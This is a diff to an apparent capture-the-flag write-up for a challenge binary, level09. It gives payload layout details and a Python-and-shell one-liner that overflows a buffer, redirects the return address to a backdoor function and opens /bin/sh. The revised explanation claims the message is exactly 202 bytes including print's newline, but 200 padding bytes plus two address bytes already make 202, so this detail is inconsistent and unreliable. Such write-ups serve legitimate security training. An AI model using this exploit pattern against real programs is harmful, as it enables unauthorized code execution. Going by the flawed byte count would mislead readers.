@@ -24,12 +24,12 @@ Specifically, we overwrite `0x4abd` with `0x488c` (bytes `\x8c\x48`).
 Payload structure:
 1.  **Username**: 40 bytes of padding + `\xca` (202). This sets the `strncpy` length to 202.
 2.  **Message**: 200 bytes of padding + `\x8c\x48`. This overwrites the return address partial bytes.
-    *   **Crucial**: We must use `sys.stdout.write` to avoid adding a newline, so `strncpy` copies exactly 202 bytes and does not pad with nulls (which would corrupt the top bytes of the address).
+    *   **Crucial**: The message must be exactly 202 bytes (including the newline from `print`), so `strncpy` copies exactly 202 bytes and does not pad with nulls (which would corrupt the top bytes of the address).
 3.  **Command**: `/bin/sh`. This is consumed by `fgets` inside `secret_backdoor` and passed to `system`.
 
 ## Exploit One-Liner
 ```bash
-(python -c 'print "A"*40 + "\xca"'; python -c 'import sys; sys.stdout.write("B"*200 + "\x8c\x48")'; cat) | ./level09
+(python -c 'print "A"*40 + "\xca"; print "B"*200 + "\x8c\x48"'; cat) | ./level09
 ```
 Then type `/bin/sh` to get a shell.
 
